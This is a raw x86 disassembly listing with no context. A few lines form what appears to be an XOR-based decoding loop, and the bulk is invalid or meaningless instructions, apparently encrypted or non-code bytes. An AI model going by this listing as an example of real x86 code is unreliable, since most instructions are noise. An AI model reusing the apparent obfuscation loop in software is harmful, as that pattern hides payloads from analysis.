  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	mov    bh,BYTE PTR [edi]
  4028e2:	fwait
  4028e3:	and    esi,0x3
  4028e6:	jle    0x402966
  4028e8:	xor    BYTE PTR [ecx+0x7e],0x7e
  4028ec:	push   0x4
  4028ee:	and    cl,BYTE PTR [eax+0x6f19247d]
  4028f4:	sub    ah,cl
  4028f6:	mov    edx,0xd14f6823
  4028fb:	jge    0x402907
  4028fd:	pushf  
  4028fe:	scas   al,BYTE PTR es:[edi]
  4028ff:	pop    esp
  402900:	(bad)  
  402901:	outs   dx,DWORD PTR ds:[esi]
  402902:	out    dx,eax
  402903:	sbb    eax,0x207d52d5
  402908:	mov    WORD PTR [ebx+0x5f6ae350],fs
  40290e:	xchg   ebx,eax
  40290f:	mov    ds:0xb7ba83ff,al
  402914:	test   DWORD PTR [esi-0x6f],0x189a29e8
  40291b:	fs dec esp
  40291d:	pop    es
  40291e:	test   esp,ecx
  402920:	and    DWORD PTR [eax-0x18],eax
  402923:	(bad)  
  402924:	iret   
  402925:	inc    eax
  402926:	dec    esi
  402927:	lods   al,BYTE PTR ds:[esi]
  402928:	mov    ebp,0xeaba6351
  40292d:	scas   al,BYTE PTR es:[edi]
  40292e:	and    al,0xe5
  402930:	mov    es,WORD PTR [ebp+0x44]
  402933:	stos   DWORD PTR es:[edi],eax
  402934:	xchg   BYTE PTR [edi-0x1d330569],ch
  40293a:	rcr    DWORD PTR [ecx-0x3fc38308],0x12
  402941:	ins    BYTE PTR es:[edi],dx
  402942:	stos   DWORD PTR es:[edi],eax
  402943:	call   0xb1786d09
  402948:	shl    DWORD PTR [edi],1
  40294a:	dec    edx
  40294b:	mov    bl,0x1d
  40294d:	idiv   DWORD PTR [edi+0x4a3e12d5]
  402953:	adc    al,0x86
  402955:	rcl    ecx,1
  402957:	and    dl,ch
  402959:	aad    0xb9
  40295b:	dec    ebx
  40295c:	(bad)  
  40295d:	out    0x56,eax
  40295f:	sub    ebp,DWORD PTR [eax+edi*4-0xb33377]
  402966:	mov    cl,0xc3
  402968:	call   0xac85:0x502547b7
  40296f:	sub    al,0xc1
  402971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402972:	push   esp
  402973:	lods   eax,DWORD PTR ds:[esi]
  402974:	retf   
  402975:	jge    0x4029cc
  402977:	out    dx,al
  402978:	rcr    BYTE PTR [ebp+0x4725bc5c],0x7f
  40297f:	aaa    
  402980:	push   esp
  402981:	cld    
  402982:	mov    ch,0xdf
  402984:	iret   
  402985:	mul    BYTE PTR [edi-0x16ed60c7]
  40298b:	aaa    
  40298c:	ficomp DWORD PTR [ecx-0x5f9b7ecd]
  402992:	out    0xe9,eax
  402994:	test   al,0x6f
  402996:	mov    al,ds:0x814eaa41
  40299b:	mov    eax,0x720bcf38
  4029a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029a1:	ret    0xa8b9
  4029a4:	in     eax,dx
  4029a5:	cmp    ecx,DWORD PTR [edx+0x2bdb7afc]
  4029ab:	or     BYTE PTR [ebx+0x36c75f66],0x10
  4029b2:	cli    
  4029b3:	call   0x3d7d:0xe87feeea
  4029ba:	lea    ecx,[esp+ebp*1+0x6f]
  4029be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029bf:	xchg   esp,eax
  4029c0:	in     eax,0x3a
  4029c2:	push   es
  4029c3:	sbb    DWORD PTR [ecx-0x27],ebp
  4029c6:	dec    ebx
  4029c7:	imul   edi
  4029c9:	out    dx,al
  4029ca:	jnp    0x4029ef
  4029cc:	pop    ss
  4029cd:	rcr    BYTE PTR [esi],1
  4029cf:	shr    BYTE PTR [esi+0x4e],cl
  4029d2:	cdq    
  4029d3:	mov    ebx,0xdd7b70b1
  4029d8:	adc    cl,BYTE PTR [edx-0x289e2475]
  4029de:	fdivr  DWORD PTR [eax*2+0x113b6f73]
  4029e5:	push   esp
  4029e7:	and    BYTE PTR [eax-0x7ae924ed],cl
  4029ed:	retf   0x6976
  4029f0:	ficomp WORD PTR [edx+0x3d]
  4029f3:	aas    
  4029f4:	pop    ebp
  4029f5:	xchg   ebp,eax
  4029f6:	lds    edi,FWORD PTR [ebx+esi*2+0x3]
  4029fa:	add    esp,DWORD PTR [eax]
  4029fc:	pop    ebx
  4029fd:	mov    al,ds:0x250ce33a
  402a02:	mov    ds:0x50878365,al
  402a07:	or     esi,DWORD PTR [edx+0xebf2f45]
  402a0d:	popf   
  402a0e:	jne    0x4029a2
  402a10:	dec    esp
  402a11:	xor    dl,ah
  402a13:	xchg   ebx,eax
  402a14:	pop    ds
  402a15:	xchg   ebp,eax
  402a16:	lock retf 
  402a18:	aad    0x5d
  402a1a:	dec    esi
  402a1b:	gs ja  0x402a4c
  402a1e:	or     eax,0xda9e2999
  402a23:	pop    DWORD PTR [edi-0x41]
  402a26:	arpl   cx,dx
  402a28:	loopne 0x4029c4
  402a2a:	clc    
  402a2b:	jecxz  0x4029b8
  402a2d:	jnp    0x4029fc
  402a2f:	in     eax,0x7b
  402a31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a32:	mov    al,0x5b
  402a34:	mov    ds:0x6fdcdb42,al
  402a39:	icebp  
  402a3a:	fiadd  WORD PTR [esi-0x7f442498]
  402a40:	xor    dh,BYTE PTR [edx-0x5da52ce6]
  402a46:	ins    DWORD PTR es:[edi],dx
  402a47:	add    al,0x3a
  402a49:	add    al,BYTE PTR [ecx]
  402a4b:	test   DWORD PTR [eax],edi
  402a4d:	data16 mov ah,0x98
  402a50:	mov    bh,bl
  402a52:	xor    al,0x4
  402a54:	mov    ebx,0xa38d607e
  402a59:	add    al,dh
  402a5b:	xchg   ecx,eax
  402a5c:	cld    
  402a5d:	add    BYTE PTR [esi+0x61],dl
  402a60:	retf   0x6f10
  402a63:	lods   al,BYTE PTR ds:[esi]
  402a64:	xor    DWORD PTR [esi-0x11],edx
  402a67:	xchg   esi,eax
  402a68:	out    dx,al
  402a69:	rcl    BYTE PTR [edi*1-0x7935c57e],cl
  402a70:	outs   dx,DWORD PTR ds:[esi]
  402a71:	scas   eax,DWORD PTR es:[edi]
  402a72:	lods   eax,DWORD PTR ds:[esi]
  402a73:	scas   eax,DWORD PTR es:[edi]
  402a74:	test   BYTE PTR [eax+0x6c3254ca],0xf8
  402a7b:	pop    esp
  402a7c:	aad    0xc7
  402a7e:	pop    ebx
  402a7f:	inc    esp
  402a80:	add    al,0x26
  402a82:	aaa    
  402a83:	adc    al,0x54
  402a85:	cmp    DWORD PTR [edi+0x2a],ebp
  402a88:	mov    bl,0x9b
  402a8a:	add    eax,0xc50d3a1f
  402a8f:	es (bad) 
  402a91:	rcr    esp,cl
  402a93:	shr    ch,cl
  402a95:	cld    
  402a96:	pop    es
  402a97:	add    ah,al
  402a99:	and    eax,0x7cf6208f
  402a9e:	push   esp
  402a9f:	loope  0x402a6b
  402aa1:	xchg   edi,eax
  402aa2:	push   ebp
  402aa3:	int3   
  402aa4:	xchg   ebx,eax
  402aa5:	and    ah,BYTE PTR [esi-0x14]
  402aa8:	sbb    al,0xdb
  402aaa:	dec    ebp
  402aab:	rcl    DWORD PTR [ecx-0x125ebd0f],1
  402ab1:	loope  0x402a9c
  402ab3:	loope  0x402adb
  402ab5:	xor    DWORD PTR [ecx-0x1baf9ab5],edi
  402abb:	dec    eax
  402abc:	cmp    esp,0x29
  402abf:	dec    ecx
  402ac0:	(bad)  
  402ac1:	aaa    
  402ac2:	(bad)  
  402ac3:	aaa    
  402ac4:	cmp    eax,0xb23e0bfa
  402ac9:	push   ebp
  402aca:	mov    ds,WORD PTR [edx-0x322bd40c]
  402ad0:	pushf  
  402ad1:	mov    bh,0xb6
  402ad3:	xor    eax,ebx
  402ad5:	push   eax
  402ad6:	xor    al,0xf8
  402ad8:	push   eax
  402ad9:	mov    ecx,0xb73b227
  402ade:	retf   0xa9ce
  402ae1:	and    DWORD PTR [eax-0x32],esp
  402ae4:	adc    esp,edx
  402ae6:	dec    ebp
  402ae7:	and    eax,0xf8b2e0d0
  402aec:	xlat   BYTE PTR ds:[ebx]
  402aed:	or     eax,0x44a3bdcd
  402af2:	adc    ebx,DWORD PTR [eax+0x44]
  402af5:	adc    al,BYTE PTR [edx]
  402af7:	mov    ?,WORD PTR [ebx]
  402af9:	out    dx,al
  402afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402afb:	and    eax,0xac437a25
  402b00:	icebp  
  402b01:	and    eax,DWORD PTR [esi+0x70]
  402b04:	fmulp  st(7),st
  402b06:	jb     0x402b02
  402b08:	sahf   
  402b09:	stos   BYTE PTR es:[edi],al
  402b0a:	mov    eax,0xa68b934
  402b0f:	mov    dh,0x9c
  402b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b12:	fld    TBYTE PTR [edi-0x704d3fa5]
  402b18:	mov    bl,0x90
  402b1a:	xchg   ebx,eax
  402b1b:	stc    
  402b1c:	add    eax,0xa5a6dc93
  402b21:	popf   
  402b22:	push   es
  402b23:	mov    esp,0x4509b66d
  402b28:	imul   ebx,DWORD PTR [esi+ebx*1],0x62
  402b2c:	iret   
  402b2d:	sbb    eax,0x270604aa
  402b32:	xchg   esi,eax
  402b33:	lods   al,BYTE PTR ds:[esi]
  402b34:	sar    DWORD PTR [ecx+0x78263d1],cl
  402b3a:	mov    eax,ds:0xb61f5987
  402b3f:	leave  
  402b40:	inc    esp
  402b41:	adc    al,0x9d
  402b43:	jl     0x402bb0
  402b45:	not    BYTE PTR [ecx-0x2c]
  402b48:	push   es
  402b49:	loop   0x402b7d
  402b4b:	cld    
  402b4c:	push   0xa090ddfc
  402b51:	stos   BYTE PTR es:[edi],al
  402b52:	dec    edi
  402b53:	mov    esi,0xceb5a901
  402b58:	int3   
  402b59:	call   0xed68:0x709d69f5
  402b60:	or     ebp,DWORD PTR [ebx+ecx*2-0x465fc3f9]
  402b67:	sahf   
  402b68:	push   ecx
  402b69:	in     eax,0x7d
  402b6b:	jge    0x402bce
  402b6d:	cwde   
  402b6e:	loop   0x402b2b
  402b70:	inc    edi
  402b71:	sub    DWORD PTR cs:[ebp-0x1b9c7190],esi
  402b78:	ins    BYTE PTR es:[edi],dx
  402b79:	fild   WORD PTR [edi-0x51cf4d66]
  402b7f:	mov    ecx,esi
  402b81:	mov    ch,0xb9
  402b83:	push   ds
  402b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b85:	(bad)  
  402b86:	imul   ecx,edx,0x7c601291
  402b8c:	out    dx,eax
  402b8d:	cmp    ecx,0x43
  402b90:	cli    
  402b91:	sub    ebp,edx
  402b93:	cmp    BYTE PTR [edx+edx*1-0x53],0x7d
  402b98:	dec    edi
  402b99:	cdq    
  402b9a:	mov    ds:0x291658f1,eax
  402b9f:	fistp  WORD PTR [ebx+ecx*4-0x954c6ff]
  402ba6:	mov    ds:0x13db5bb7,al
  402bab:	xor    al,0x83
  402bad:	mov    bh,dh
  402baf:	sub    al,0x2f
  402bb1:	or     al,0x96
  402bb3:	jne    0x402b64
  402bb5:	mov    ebx,0xbbbdfbf6
  402bba:	outs   dx,DWORD PTR ds:[esi]
  402bbb:	adc    ebx,DWORD PTR [ebx-0x50]
  402bbe:	imul   edi,DWORD PTR [eax-0x7c],0x2f
  402bc2:	ins    DWORD PTR es:[edi],dx
  402bc3:	push   ss
  402bc4:	pop    eax
  402bc5:	fld    QWORD PTR [eax+ebx*4]
  402bc8:	jle    0x402b75
  402bca:	xchg   BYTE PTR ds:0xca68eee3,ah
  402bd1:	into   
  402bd2:	iret   
  402bd3:	add    eax,0x48b31905
  402bd8:	cdq    
  402bd9:	mov    al,0x44
  402bdb:	jo     0x402b9b
  402bdd:	pop    edx
  402bde:	sbb    edi,edx
  402be0:	es loope 0x402bf8
  402be3:	jle    0x402c06
  402be5:	xchg   esp,eax
  402be6:	cmp    bh,ch
  402be8:	xchg   ebp,eax
  402be9:	lahf   
  402bea:	cmp    edi,DWORD PTR [ecx]
  402bec:	adc    eax,0xc623879c
  402bf1:	test   BYTE PTR [eax+0x48],ah
  402bf4:	xchg   BYTE PTR [ecx],dh
  402bf6:	jmp    0x99778d6d
  402bfb:	mov    ah,0x16
  402bfd:	int3   
  402bfe:	inc    eax
  402bff:	imul   edx,DWORD PTR [edi+0x2f],0x5768c256
  402c06:	int3   
  402c07:	test   eax,0xd2c862e5
  402c0c:	fwait
  402c0d:	sbb    eax,0x14c4af00
  402c12:	clc    
  402c13:	icebp  
  402c14:	out    dx,eax
  402c15:	sub    bh,BYTE PTR [eax+0x76]
  402c18:	lock pop ecx
  402c1a:	outs   dx,BYTE PTR ds:[esi]
  402c1b:	int    0xfc
  402c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c1e:	sbb    ah,BYTE PTR [ecx+0x547138ad]
  402c24:	jle    0x402bca
  402c26:	rol    DWORD PTR [edi],cl
  402c28:	iret   
  402c29:	scas   al,BYTE PTR es:[edi]
  402c2a:	or     ebx,ebp
  402c2c:	dec    edi
  402c2d:	sbb    edi,eax
  402c2f:	sub    DWORD PTR [ebp-0x84503e7],esp
  402c35:	mov    ebx,0x95e51c
  402c3a:	mov    edx,0xebee1795
  402c3f:	xor    DWORD PTR [edi],eax
  402c41:	mov    esp,0xf1b33af8
  402c46:	and    dh,BYTE PTR [edx+0x7d785c8c]
  402c4c:	cwde   
  402c4d:	aad    0x75
  402c4f:	mov    dh,0xff
  402c51:	das    
  402c52:	jmp    0x402cb4
  402c54:	adc    bl,ah
  402c56:	dec    edi
  402c57:	jnp    0x402c5f
  402c59:	jnp    0x402bfc
  402c5b:	pop    eax
  402c5c:	popa   
  402c5d:	lea    ecx,[edx+0x6716f46d]
  402c63:	mov    esi,DWORD PTR [ebp-0x5422b19]
  402c69:	pop    ss
  402c6a:	add    BYTE PTR [ecx-0x18e5b83f],0xb7
  402c71:	(bad)  
  402c73:	pop    es
  402c74:	push   edx
  402c75:	outs   dx,BYTE PTR ds:[esi]
  402c76:	sahf   
  402c77:	lods   al,BYTE PTR ds:[esi]
  402c78:	and    BYTE PTR [esi+0x25],ah
  402c7b:	push   cs
  402c7c:	cmp    eax,0x8b8e244d
  402c81:	inc    ebp
  402c82:	lock and DWORD PTR [eax],0x751c9d
  402c89:	jmp    0x402858
  402c8e:	mov    eax,DWORD PTR [ebp-0xc]
  402c91:	mov    edx,DWORD PTR [ebp-0x18]
  402c94:	or     eax,edx
  402c96:	cmp    eax,0xfabf2dff
  402c9b:	je     0x403060
  402ca1:	mov    eax,DWORD PTR [ebp-0x10]
  402ca4:	xor    DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	aaa    
  402cc1:	call   0x7e7e:0x70a2f8e
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	mov    ecx,0xd3dcd06
  402cd1:	pop    eax
  402cd2:	lods   al,BYTE PTR ds:[esi]
  402cd3:	pop    esi
  402cd5:	cmp    BYTE PTR [edi],0x5
  402cd8:	ficom  DWORD PTR [esi+0x6a]
  402cdb:	lock jnp 0x402cbd
  402cde:	push   ecx
  402cdf:	sub    edx,0xffffffe4
  402ce2:	fs pop esi
  402ce4:	pop    ss
  402ce5:	jecxz  0x402d60
  402ce7:	push   esp
  402ce8:	and    DWORD PTR [edi+0x5c],esi
  402ceb:	pop    ds
  402cec:	or     DWORD PTR es:[eax-0x5963be25],edi
  402cf3:	push   cs
  402cf4:	into   
  402cf5:	fisubr DWORD PTR [eax]
  402cf7:	mov    al,ds:0xea486f90
  402cfc:	add    bh,BYTE PTR [ecx-0x384be335]
  402d02:	inc    esp
  402d03:	pop    es
  402d04:	jnp    0x402d17
  402d06:	js     0x402d45
  402d08:	(bad)  
  402d0a:	lahf   
  402d0b:	add    eax,0x855f8c09
  402d10:	inc    edx
  402d11:	retf   
  402d12:	cpuid  
  402d14:	imul   esp,DWORD PTR [ecx+0x72a55658],0x33
  402d1b:	mov    esi,0xa0605002
  402d20:	in     eax,0x3f
  402d22:	mov    ecx,0xecac7d0d
  402d27:	rcl    BYTE PTR [esi-0x62],1
  402d2a:	std    
  402d2b:	rcr    DWORD PTR [ebp+0x1acc5bcd],0xb9
  402d32:	adc    BYTE PTR ds:0xe74b2029,dl
  402d38:	xchg   BYTE PTR [eax-0x3c609de7],al
  402d3e:	enter  0xca3e,0x9b
  402d42:	mov    ebx,0xf28d58e2
  402d47:	dec    ebx
  402d48:	add    BYTE PTR ds:[ecx],0x1c
  402d4c:	sub    eax,0x1eeef849
  402d51:	pop    edx
  402d52:	cmp    al,0x44
  402d54:	pushf  
  402d55:	add    eax,DWORD PTR [ecx-0x48d70a98]
  402d5b:	push   0xab3c1b5e
  402d60:	mov    al,0x35
  402d62:	inc    eax
  402d63:	jno    0x402dc7
  402d65:	aaa    
  402d66:	outs   dx,DWORD PTR ds:[esi]
  402d67:	adc    ecx,esp
  402d69:	outs   dx,DWORD PTR ds:[esi]
  402d6a:	(bad)  
  402d6c:	rcr    BYTE PTR [edx-0x2dcd0a53],0x41
  402d73:	sahf   
  402d74:	pop    edi
  402d75:	es dec bh
  402d78:	dec    ecx
  402d79:	mov    bl,0x9f
  402d7b:	fcmovb st,st(5)
  402d7d:	fsub   QWORD PTR [ebx]
  402d7f:	dec    esp
  402d80:	stc    
  402d81:	mov    DWORD PTR [ebp-0x18118b37],ecx
  402d87:	ds (bad) 
  402d89:	pop    edi
  402d8a:	mov    al,0x1d
  402d8c:	mov    edi,0x6c9d935c
  402d91:	ror    DWORD PTR [ebp-0x48],1
  402d94:	in     eax,0xb2
  402d96:	mov    BYTE PTR [ebp-0x59],0x80
  402d9a:	xchg   edx,eax
  402d9b:	or     eax,0xe4cd8953
  402da0:	daa    
  402da1:	fiadd  DWORD PTR [esi+0x7d]
  402da4:	loopne 0x402e19
  402da6:	dec    ebp
  402da7:	cmp    al,0x74
  402da9:	inc    ecx
  402daa:	add    BYTE PTR [edi+0x7d],bl
  402dad:	cwde   
  402dae:	push   cs
  402daf:	sti    
  402db0:	je     0x402e0a
  402db2:	pop    ebp
  402db3:	mov    cl,0xe1
  402db5:	(bad)  
  402db6:	xchg   esp,eax
  402db7:	or     eax,0x314b5541
  402dbc:	xchg   ebx,eax
  402dbd:	sbb    al,0xa
  402dbf:	inc    ebx
  402dc0:	leave  
  402dc1:	xchg   ecx,eax
  402dc2:	adc    eax,0xb6880d19
  402dc7:	lock ja 0x402db8
  402dca:	xor    al,0xc9
  402dcc:	popf   
  402dcd:	sbb    DWORD PTR [ebx+0xc213dfb],esi
  402dd3:	popf   
  402dd4:	inc    esp
  402dd5:	sub    ebx,DWORD PTR [edx]
  402dd7:	sub    DWORD PTR [ebx+0x12],eax
  402dda:	mov    ecx,0x650182e4
  402ddf:	mov    edi,0x41b9f5e8
  402de4:	aaa    
  402de5:	sub    cl,BYTE PTR [ebp+0x1c]
  402de8:	mov    bh,0x2b
  402dea:	iret   
  402deb:	shl    BYTE PTR [ecx+0x599bd9d1],1
  402df1:	rcl    BYTE PTR [ebx+0x1f],0x71
  402df5:	sub    dh,BYTE PTR [edx]
  402df7:	pop    edx
  402df8:	cs push ss
  402dfa:	mov    edi,0x53fed538
  402dff:	inc    edx
  402e00:	adc    al,0x31
  402e02:	pop    esi
  402e03:	nop
  402e04:	jp     0x402dcc
  402e06:	sub    al,0x81
  402e08:	xchg   edi,eax
  402e09:	fadd   DWORD PTR ss:[ebx+ebx*8]
  402e0d:	ins    DWORD PTR es:[edi],dx
  402e0e:	ins    BYTE PTR es:[edi],dx
  402e0f:	shl    dl,0xc4
  402e12:	int    0x10
  402e14:	lods   eax,DWORD PTR ds:[esi]
  402e15:	bound  ecx,QWORD PTR [esi+0x690ad1a2]
  402e1b:	add    eax,0x2e4bfd7e
  402e20:	mov    cl,0x31
  402e22:	loope  0x402e72
  402e24:	stos   BYTE PTR es:[edi],al
  402e25:	outs   dx,DWORD PTR ds:[esi]
  402e26:	jp     0x402e29
  402e28:	adc    eax,0x2d76c1bc
  402e2d:	out    dx,al
  402e2e:	(bad)  
  402e2f:	push   gs
  402e31:	mov    bl,0xae
  402e33:	fldcw  WORD PTR [edx-0x7bbb1123]
  402e39:	sti    
  402e3a:	in     eax,dx
  402e3b:	lds    ecx,FWORD PTR [edi-0x6a]
  402e3e:	imul   esp,DWORD PTR [edx-0x3c],0x1faa62f3
  402e45:	add    dl,bh
  402e47:	dec    edi
  402e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e49:	jb     0x402e67
  402e4b:	mov    DWORD PTR [eax],esp
  402e4d:	dec    ebp
  402e4e:	push   ds
  402e4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e50:	mov    edx,0xe2888f2a
  402e55:	stos   BYTE PTR es:[edi],al
  402e56:	mov    ecx,0xe16e8b1a
  402e5b:	pop    esi
  402e5c:	je     0x402e5b
  402e5e:	test   DWORD PTR [ecx],esp
  402e60:	outs   dx,BYTE PTR ds:[esi]
  402e61:	pop    ecx
  402e62:	or     ah,BYTE PTR [edx]
  402e64:	das    
  402e65:	push   0xe0e8cc0a
  402e6a:	inc    esp
  402e6b:	fst    DWORD PTR ds:0x39153939
  402e71:	xchg   edx,eax
  402e72:	ror    ch,0xd2
  402e75:	dec    ebp
  402e76:	(bad)  
  402e77:	sub    al,0x9
  402e79:	mov    esp,DWORD PTR [ebp+0x2e]
  402e7c:	dec    edx
  402e7d:	stc    
  402e7e:	mov    bh,0x2a
  402e80:	je     0x402e8f
  402e82:	jecxz  0x402e38
  402e84:	xor    eax,0x9b1da66
  402e89:	scas   al,BYTE PTR es:[edi]
  402e8a:	daa    
  402e8b:	cs inc ebp
  402e8d:	icebp  
  402e8e:	sbb    ebp,eax
  402e90:	(bad)  
  402e91:	cld    
  402e92:	in     eax,dx
  402e93:	jae    0x402edc
  402e95:	mov    ch,0xb9
  402e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e98:	dec    edi
  402e99:	adc    eax,edi
  402e9b:	push   edx
  402e9c:	(bad)  
  402e9d:	icebp  
  402e9e:	or     eax,0xcf0670d5
  402ea3:	adc    dh,BYTE PTR [ecx]
  402ea5:	mov    gs,WORD PTR [ebx]
  402ea7:	add    al,0xab
  402ea9:	mov    ebx,DWORD PTR [eax-0x66]
  402eac:	mov    ebx,0x83725381
  402eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402eb2:	sub    DWORD PTR [edx],0x79f4886
  402eb8:	bound  esp,QWORD PTR [ecx-0x18]
  402ebb:	and    DWORD PTR [edx],esi
  402ebd:	cmp    edi,ebp
  402ebf:	cmp    ebx,DWORD PTR [ecx+0x3a355b9d]
  402ec5:	jecxz  0x402f1b
  402ec7:	ins    DWORD PTR es:[edi],dx
  402ec8:	ret    0xee2b
  402ecb:	outs   dx,DWORD PTR ds:[esi]
  402ecc:	call   0xf6cd:0xbb1c94ab
  402ed3:	ret    0x1ff3
  402ed6:	adc    cl,al
  402ed8:	shl    DWORD PTR ds:0x59d3d6b,1
  402ede:	jne    0x402e99
  402ee0:	and    BYTE PTR [esi],al
  402ee2:	pop    ebp
  402ee3:	pmaxsw mm0,mm1
  402ee6:	out    0xc3,eax
  402ee8:	(bad)  
  402ee9:	xor    al,0x15
  402eeb:	xor    ah,dl
  402eed:	das    
  402eee:	push   0xe903f9cd
  402ef3:	aas    
  402ef4:	xchg   ebp,eax
  402ef5:	stos   BYTE PTR es:[edi],al
  402ef6:	retf   
  402ef7:	shl    DWORD PTR [ebp+0x18],0xae
  402efb:	xor    eax,0xc3c65e2e
  402f00:	jl     0x402ee1
  402f02:	jns    0x402f33
  402f04:	mov    bh,bh
  402f06:	jl     0x402ee7
  402f08:	mov    esp,0xc4080f9c
  402f0d:	pop    edx
  402f0e:	ror    BYTE PTR [ecx],cl
  402f10:	jp     0x402f1d
  402f12:	(bad)  
  402f13:	push   ebx
  402f14:	pop    edi
  402f15:	in     al,0xad
  402f17:	inc    esp
  402f18:	mov    WORD PTR [edx],fs
  402f1a:	(bad)  
  402f1b:	fnstsw WORD PTR [eax+0x4f]
  402f1e:	mov    DWORD PTR [eax],eax
  402f20:	(bad)  
  402f21:	pop    ds
  402f22:	adc    ebx,DWORD PTR [ebx+0x36]
  402f25:	into   
  402f26:	imul   eax,DWORD PTR [esi],0x9d1d0981
  402f2c:	aam    0x5
  402f2e:	add    DWORD PTR [edi+eax*2+0x2b],esi
  402f32:	or     eax,edi
  402f34:	lds    eax,FWORD PTR [eax-0x22]
  402f37:	xor    al,cl
  402f39:	mov    edi,0x1e878e3c
  402f3e:	ins    DWORD PTR es:[edi],dx
  402f3f:	test   eax,0xdc3023dd
  402f44:	push   ebx
  402f45:	adc    BYTE PTR [edx],dh
  402f47:	(bad)
  402f4a:	jge    0x402fc8
  402f4c:	pop    es
  402f4d:	adc    DWORD PTR [eax],ebx
  402f4f:	outs   dx,BYTE PTR ds:[esi]
  402f50:	adc    dl,cl
  402f52:	(bad)  
  402f53:	retf   
  402f54:	jae    0x402f63
  402f56:	inc    ebp
  402f57:	fld    QWORD PTR [edx-0x218359ba]
  402f5d:	sub    eax,0x3d83376a
  402f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f64:	lock sbb BYTE PTR [eax+0x2d],bh
  402f68:	add    bh,BYTE PTR [esi-0x75]
  402f6b:	inc    ecx
  402f6c:	xchg   ebx,eax
  402f6d:	inc    eax
  402f6e:	inc    ecx
  402f6f:	sbb    bh,BYTE PTR [edi+0x5295248b]
  402f75:	mov    ah,0x1d
  402f77:	jle    0x402fde
  402f79:	lock xor DWORD PTR [esi+eax*1],edx
  402f7d:	jmp    0x95bc:0x5e6936a6
  402f84:	mov    ch,0x62
  402f86:	jae    0x402ff0
  402f88:	inc    ebx
  402f89:	fild   QWORD PTR [eax]
  402f8b:	or     ah,BYTE PTR [ecx-0x30de8422]
  402f91:	enter  0xedb5,0x99
  402f95:	and    DWORD PTR [ebp-0x3f02058f],0x744bc177
  402f9f:	(bad)  
  402fa1:	shr    BYTE PTR [edi+edx*1+0x559c7a8c],0xd7
  402fa9:	jle    0x403027
  402fab:	mov    ds:0x3a9d942e,al
  402fb0:	cli    
  402fb1:	addr16 out 0x2f,al
  402fb4:	(bad)  
  402fb5:	iret   
  402fb6:	mov    cl,0xf2
  402fb8:	retf   
  402fb9:	mov    eax,cs
  402fbb:	cmp    eax,0x9c348c53
  402fc0:	das    
  402fc1:	xor    ah,BYTE PTR [edi+0x5c]
  402fc4:	pop    ds
  402fc5:	add    BYTE PTR [edi-0x72f6894f],dh
  402fcb:	rcl    dh,cl
  402fcd:	add    eax,0x2a0d2cfb
  402fd2:	rol    BYTE PTR [edx+0xf],0xe6
  402fd6:	sbb    BYTE PTR [edi-0x22],dh
  402fd9:	or     eax,0xb2af9b81
  402fde:	nop
  402fdf:	es enter 0xccc3,0xab
  402fe4:	dec    ebx
  402fe5:	mov    ecx,0xca487ec
  402fea:	xchg   ecx,eax
  402feb:	add    DWORD PTR [ebp+0x4a2e92a1],esi
  402ff1:	pop    eax
  402ff2:	xor    cl,BYTE PTR [ebx]
  402ff4:	fsub   st,st(4)
  402ff6:	popf   
  402ff7:	or     ebp,esi
  402ff9:	xor    eax,0x58977ddd
  402ffe:	add    al,BYTE PTR [ebp-0x50]
  403001:	rcr    BYTE PTR ds:0xf2aaf792,1
  403007:	mov    ds:0x578ce24a,al
  40300c:	mov    ebx,ebp
  40300e:	pop    es
  40300f:	or     BYTE PTR [ebp+0x1d57c3d8],0xae
  403016:	pusha  
  403017:	cmp    ch,bl
  403019:	xchg   edx,eax
  40301a:	dec    ebx
  40301b:	fs js  0x402fb0
  40301e:	lods   eax,DWORD PTR ds:[esi]
  40301f:	lahf   
  403020:	call   0x8837:0xe78e85f
  403027:	in     al,0x67
  403029:	mov    cs,WORD PTR [eax]
  40302b:	or     eax,0x232de009
  403030:	mov    ebx,0xa21f15e0
  403035:	mov    al,ds:0xed2c3a94
  40303a:	ins    BYTE PTR es:[edi],dx
  40303b:	and    al,al
  40303d:	dec    eax
  40303e:	sbb    ch,BYTE PTR [edx+0x2e2d1c06]
  403044:	push   esi
  403045:	in     eax,0x90
  403047:	shl    dh,cl
  403049:	out    0x56,al
  40304b:	lock mov dh,0x31
  40304e:	in     al,0x93
  403050:	repz and DWORD PTR [ebp+0x45ec3d48],ebp
  403057:	shl    BYTE PTR [ebp+0x1a],0x46
  40305b:	(bad)  
  40305c:	mov    eax,ds:0x66d641a4
  403061:	mov    eax,DWORD PTR [ebp-0x4]
  403064:	jmp    0x403415
  403069:	jl     0x403082
  40306b:	sub    al,0xf7
  40306d:	jge    0x402ffc
  40306f:	jge    0x40306e
  403071:	inc    edx
  403072:	sbb    dh,BYTE PTR [ebx]
  403074:	(bad)  [ebp-0x61b4dce6]
